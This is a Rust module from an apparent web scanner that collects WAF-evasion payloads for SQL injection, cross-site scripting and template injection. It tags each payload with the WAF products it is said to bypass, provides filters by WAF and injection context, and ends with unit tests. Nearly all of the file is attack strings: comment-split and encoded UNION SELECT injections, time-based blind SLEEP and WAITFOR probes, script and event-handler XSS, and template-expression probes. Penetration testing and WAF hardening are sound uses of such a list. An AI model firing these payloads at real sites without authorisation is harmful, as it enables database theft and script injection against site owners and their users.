//! WAF Bypass Payloads Module
//!
//! Provides WAF-specific bypass payloads for SQLi, XSS, and SSTI.
//! Each payload category includes encoding tricks, comment injection,
//! case variations, and protocol-level evasion techniques.

/// A bypass payload with metadata about its technique and target WAFs.
#[derive(Debug, Clone)]
pub struct BypassPayload {
    /// The payload string to inject
    pub payload: String,
    /// Human-readable technique name
    pub technique: &'static str,
    /// WAFs this is known to bypass (empty = generic)
    pub target_wafs: Vec<&'static str>,
    /// Injection context: "url_param", "body_param", "header"
    pub context: &'static str,
}

/// SQLi bypass payloads organized by technique
pub fn sqli_bypass_payloads() -> Vec<BypassPayload> {
    let mut payloads = Vec::new();

    // --- Comment injection ---
    payloads.push(BypassPayload {
        payload: "' OR 1=1--".into(),
        technique: "Inline comment bypass",
        target_wafs: vec![],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "' /*!OR*/ 1=1--".into(),
        technique: "MySQL versioned comment",
        target_wafs: vec!["ModSecurity", "Cloudflare"],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "' /*!50000OR*/ 1=1--".into(),
        technique: "MySQL version-specific comment",
        target_wafs: vec!["ModSecurity"],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "'/**/OR/**/1=1--".into(),
        technique: "Block comment padding",
        target_wafs: vec!["Cloudflare", "Akamai"],
        context: "url_param",
    });

    // --- Case variation ---
    payloads.push(BypassPayload {
        payload: "' oR 1=1--".into(),
        technique: "Mixed case bypass",
        target_wafs: vec!["ModSecurity"],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "' UnIoN sElEcT 1,2,3--".into(),
        technique: "Mixed case UNION SELECT",
        target_wafs: vec!["ModSecurity", "Cloudflare"],
        context: "url_param",
    });

    // --- Encoding tricks ---
    payloads.push(BypassPayload {
        payload: "%27%20OR%201%3D1--".into(),
        technique: "URL encoding",
        target_wafs: vec![],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "' OR 0x31=0x31--".into(),
        technique: "Hex encoding of values",
        target_wafs: vec!["ModSecurity", "WAF"],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "' OR CHAR(49)=CHAR(49)--".into(),
        technique: "CHAR() encoding",
        target_wafs: vec!["ModSecurity", "Cloudflare"],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "' OR 1=1--%0A".into(),
        technique: "Trailing newline bypass",
        target_wafs: vec!["ModSecurity"],
        context: "url_param",
    });

    // --- Double encoding ---
    payloads.push(BypassPayload {
        payload: "%2527%2520OR%25201%253D1--".into(),
        technique: "Double URL encoding",
        target_wafs: vec!["Cloudflare", "Akamai", "F5 BIG-IP ASM"],
        context: "url_param",
    });

    // --- Alternative syntax ---
    payloads.push(BypassPayload {
        payload: "' OR '1'='1'/*".into(),
        technique: "Block comment termination",
        target_wafs: vec![],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "1' AND '1'='1".into(),
        technique: "AND tautology",
        target_wafs: vec![],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "1' AND 1=1 LIMIT 1--".into(),
        technique: "LIMIT clause injection",
        target_wafs: vec!["ModSecurity"],
        context: "url_param",
    });

    // --- UNION SELECT bypass ---
    payloads.push(BypassPayload {
        payload: "1' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--".into(),
        technique: "Versioned UNION SELECT",
        target_wafs: vec!["ModSecurity", "Cloudflare"],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "1' UN/**/ION SEL/**/ECT 1,2,3--".into(),
        technique: "Comment-split UNION SELECT",
        target_wafs: vec!["Cloudflare", "Akamai"],
        context: "url_param",
    });

    // --- Time-based blind bypass ---
    payloads.push(BypassPayload {
        payload: "' OR SLEEP(5)--".into(),
        technique: "MySQL SLEEP",
        target_wafs: vec![],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "'; WAITFOR DELAY '0:0:5'--".into(),
        technique: "MSSQL WAITFOR",
        target_wafs: vec![],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "' OR pg_sleep(5)--".into(),
        technique: "PostgreSQL pg_sleep",
        target_wafs: vec![],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "' /*!50000OR*/ SLEEP(5)--".into(),
        technique: "Versioned SLEEP",
        target_wafs: vec!["ModSecurity"],
        context: "url_param",
    });

    // --- WAF-specific evasion ---
    payloads.push(BypassPayload {
        payload: "' OR 1=1-- -".into(),
        technique: "Double dash comment",
        target_wafs: vec!["ModSecurity"],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "' OR 1=1#".into(),
        technique: "Hash comment",
        target_wafs: vec!["ModSecurity"],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "' OR 1=1/".into(),
        technique: "Slash termination",
        target_wafs: vec![],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "'\\'' OR '1'='1".into(),
        technique: "Escaped quote bypass",
        target_wafs: vec!["ModSecurity", "Cloudflare"],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "' OR ''='".into(),
        technique: "Empty string comparison",
        target_wafs: vec!["ModSecurity"],
        context: "url_param",
    });

    // --- Space alternatives ---
    payloads.push(BypassPayload {
        payload: "'/**/OR/**/1=1--".into(),
        technique: "Block comment as space",
        target_wafs: vec!["ModSecurity", "Cloudflare"],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "'%09OR%091=1--".into(),
        technique: "Tab as space",
        target_wafs: vec!["ModSecurity"],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "'%0AOR%0A1=1--".into(),
        technique: "Newline as space",
        target_wafs: vec!["ModSecurity"],
        context: "url_param",
    });

    payloads
}

/// XSS bypass payloads organized by technique
pub fn xss_bypass_payloads() -> Vec<BypassPayload> {
    let mut payloads = Vec::new();

    // --- Basic event handler bypass ---
    payloads.push(BypassPayload {
        payload: "<img src=x onerror=alert(1)>".into(),
        technique: "Image onerror",
        target_wafs: vec![],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "<svg/onload=alert(1)>".into(),
        technique: "SVG onload",
        target_wafs: vec!["Cloudflare"],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "<body onload=alert(1)>".into(),
        technique: "Body onload",
        target_wafs: vec![],
        context: "url_param",
    });

    // --- Case variation XSS ---
    payloads.push(BypassPayload {
        payload: "<ScRiPt>alert(1)</ScRiPt>".into(),
        technique: "Mixed case script tag",
        target_wafs: vec!["ModSecurity"],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "<IMG SRC=x oNeRrOr=alert(1)>".into(),
        technique: "Mixed case event handler",
        target_wafs: vec!["ModSecurity"],
        context: "url_param",
    });

    // --- Encoding tricks ---
    payloads.push(BypassPayload {
        payload: "&#60;script&#62;alert(1)&#60;/script&#62;".into(),
        technique: "HTML entity encoding",
        target_wafs: vec!["ModSecurity"],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "%3Cscript%3Ealert(1)%3C/script%3E".into(),
        technique: "URL encoding",
        target_wafs: vec![],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "\x3cscript\x3ealert(1)\x3c/script\x3e".into(),
        technique: "Hex escape encoding",
        target_wafs: vec!["ModSecurity"],
        context: "url_param",
    });

    // --- Quote/attribute escape ---
    payloads.push(BypassPayload {
        payload: "\" onmouseover=alert(1) \"".into(),
        technique: "Attribute escape",
        target_wafs: vec!["Cloudflare"],
        context: "body_param",
    });
    payloads.push(BypassPayload {
        payload: "' onmouseover='alert(1)'".into(),
        technique: "Single quote attribute escape",
        target_wafs: vec![],
        context: "body_param",
    });
    payloads.push(BypassPayload {
        payload: "'; alert(1)//".into(),
        technique: "JS string escape",
        target_wafs: vec![],
        context: "body_param",
    });

    // --- Filter bypass ---
    payloads.push(BypassPayload {
        payload: "<scr<script>ipt>alert(1)</scr</script>ipt>".into(),
        technique: "Nested tag bypass",
        target_wafs: vec!["ModSecurity", "WAF"],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "<script>alert`1`</script>".into(),
        technique: "Backtick operator",
        target_wafs: vec!["Cloudflare"],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "<script>alert(1)//".into(),
        technique: "Unbalanced tag",
        target_wafs: vec![],
        context: "url_param",
    });

    // --- Double encoding XSS ---
    payloads.push(BypassPayload {
        payload: "%253Cscript%253Ealert(1)%253C%252Fscript%253E".into(),
        technique: "Double URL encoding",
        target_wafs: vec!["Cloudflare", "Akamai", "F5 BIG-IP ASM"],
        context: "url_param",
    });

    // --- JavaScript protocol ---
    payloads.push(BypassPayload {
        payload: "javascript:alert(1)".into(),
        technique: "JavaScript protocol",
        target_wafs: vec![],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "java\nscript:alert(1)".into(),
        technique: "Newline in protocol",
        target_wafs: vec!["ModSecurity", "Cloudflare"],
        context: "url_param",
    });

    // --- Polyglot payloads ---
    payloads.push(BypassPayload {
        payload: "'-alert(1)-'".into(),
        technique: "Polyglot string escape",
        target_wafs: vec!["Cloudflare"],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "\"-alert(1)-\"".into(),
        technique: "Polyglot double quote",
        target_wafs: vec![],
        context: "url_param",
    });

    payloads
}

/// SSTI bypass payloads organized by technique
pub fn ssti_bypass_payloads() -> Vec<BypassPayload> {
    let mut payloads = Vec::new();

    // --- Jinja2 / Twig ---
    payloads.push(BypassPayload {
        payload: "{{7*7}}".into(),
        technique: "Math evaluation",
        target_wafs: vec![],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "{{7*'7'}}".into(),
        technique: "String multiplication",
        target_wafs: vec!["ModSecurity"],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "${7*7}".into(),
        technique: "Dollar brace notation",
        target_wafs: vec!["ModSecurity"],
        context: "url_param",
    });

    // --- Spacing bypass ---
    payloads.push(BypassPayload {
        payload: "{{ 7*7 }}".into(),
        technique: "Extra spaces",
        target_wafs: vec!["ModSecurity"],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "{{7*\t7}}".into(),
        technique: "Tab in expression",
        target_wafs: vec!["ModSecurity"],
        context: "url_param",
    });

    // --- Encoding tricks ---
    payloads.push(BypassPayload {
        payload: "%7B%7B7*7%7D%7D".into(),
        technique: "URL encoding braces",
        target_wafs: vec!["Cloudflare"],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "{%257B%257B7*7%257D%257D".into(),
        technique: "Double URL encoding",
        target_wafs: vec!["Cloudflare", "Akamai"],
        context: "url_param",
    });

    // --- Alternative delimiters ---
    payloads.push(BypassPayload {
        payload: "{% print(7*7) %}".into(),
        technique: "Twig print tag",
        target_wafs: vec![],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "#{7*7}".into(),
        technique: "Ruby ERB interpolation",
        target_wafs: vec![],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "<%= 7*7 %>".into(),
        technique: "ERB tag",
        target_wafs: vec![],
        context: "url_param",
    });

    // --- FreeMarker / Velocity ---
    payloads.push(BypassPayload {
        payload: "${7*7}".into(),
        technique: "FreeMarker interpolation",
        target_wafs: vec![],
        context: "url_param",
    });
    payloads.push(BypassPayload {
        payload: "#set($x=7*7)$x".into(),
        technique: "Velocity variable",
        target_wafs: vec![],
        context: "url_param",
    });

    payloads
}

/// Get all bypass payloads (SQLi + XSS + SSTI)
pub fn all_bypass_payloads() -> Vec<BypassPayload> {
    let mut payloads = Vec::new();
    payloads.extend(sqli_bypass_payloads());
    payloads.extend(xss_bypass_payloads());
    payloads.extend(ssti_bypass_payloads());
    payloads
}

/// Filter payloads by target WAF name
pub fn payloads_for_waf(waf_name: &str) -> Vec<BypassPayload> {
    all_bypass_payloads()
        .into_iter()
        .filter(|p| p.target_wafs.is_empty() || p.target_wafs.iter().any(|w| w.eq_ignore_ascii_case(waf_name)))
        .collect()
}

/// Filter payloads by injection context
pub fn payloads_for_context(context: &str) -> Vec<BypassPayload> {
    all_bypass_payloads()
        .into_iter()
        .filter(|p| p.context == context)
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sqli_payloads_not_empty() {
        let payloads = sqli_bypass_payloads();
        assert!(payloads.len() >= 20, "Expected at least 20 SQLi bypass payloads, got {}", payloads.len());
    }

    #[test]
    fn test_xss_payloads_not_empty() {
        let payloads = xss_bypass_payloads();
        assert!(payloads.len() >= 15, "Expected at least 15 XSS bypass payloads, got {}", payloads.len());
    }

    #[test]
    fn test_ssti_payloads_not_empty() {
        let payloads = ssti_bypass_payloads();
        assert!(payloads.len() >= 8, "Expected at least 8 SSTI bypass payloads, got {}", payloads.len());
    }

    #[test]
    fn test_all_payloads_have_technique() {
        for payload in all_bypass_payloads() {
            assert!(!payload.technique.is_empty(), "Payload missing technique name");
            assert!(!payload.payload.is_empty(), "Payload missing payload string");
        }
    }

    #[test]
    fn test_payloads_for_waf_modsecurity() {
        let payloads = payloads_for_waf("ModSecurity");
        assert!(!payloads.is_empty(), "Should have ModSecurity-specific payloads");
        // All should be either generic or ModSecurity-targeted
        for p in &payloads {
            assert!(
                p.target_wafs.is_empty() || p.target_wafs.iter().any(|w| w.contains("ModSecurity")),
                "Payload '{}' targets {:?} but not ModSecurity",
                p.technique,
                p.target_wafs
            );
        }
    }

    #[test]
    fn test_payloads_for_waf_cloudflare() {
        let payloads = payloads_for_waf("Cloudflare");
        assert!(!payloads.is_empty(), "Should have Cloudflare-specific payloads");
    }

    #[test]
    fn test_payloads_for_context_body_param() {
        let payloads = payloads_for_context("body_param");
        assert!(!payloads.is_empty(), "Should have body_param payloads");
        for p in &payloads {
            assert_eq!(p.context, "body_param");
        }
    }

    #[test]
    fn test_payloads_for_context_url_param() {
        let payloads = payloads_for_context("url_param");
        assert!(!payloads.is_empty(), "Should have url_param payloads");
    }

    #[test]
    fn test_generic_payloads_exist() {
        let all = all_bypass_payloads();
        let generic = all.iter().filter(|p| p.target_wafs.is_empty()).count();
        assert!(generic > 5, "Should have at least 5 generic (WAF-agnostic) payloads, got {}", generic);
    }

    #[test]
    fn test_bypass_techniques_coverage() {
        let payloads = all_bypass_payloads();
        let techniques: Vec<&str> = payloads.iter().map(|p| p.technique).collect();
        // Should cover various categories
        assert!(techniques.iter().any(|t| t.contains("comment") || t.contains("Comment")), "Should have comment-based techniques");
        assert!(techniques.iter().any(|t| t.contains("case") || t.contains("Case") || t.contains("Mixed")), "Should have case variation techniques");
        assert!(techniques.iter().any(|t| t.contains("ncod") || t.contains("entity") || t.contains("URL")), "Should have encoding techniques");
    }

    #[test]
    fn test_clone_works() {
        let payloads = sqli_bypass_payloads();
        let cloned = payloads.clone();
        assert_eq!(payloads.len(), cloned.len());
    }
}
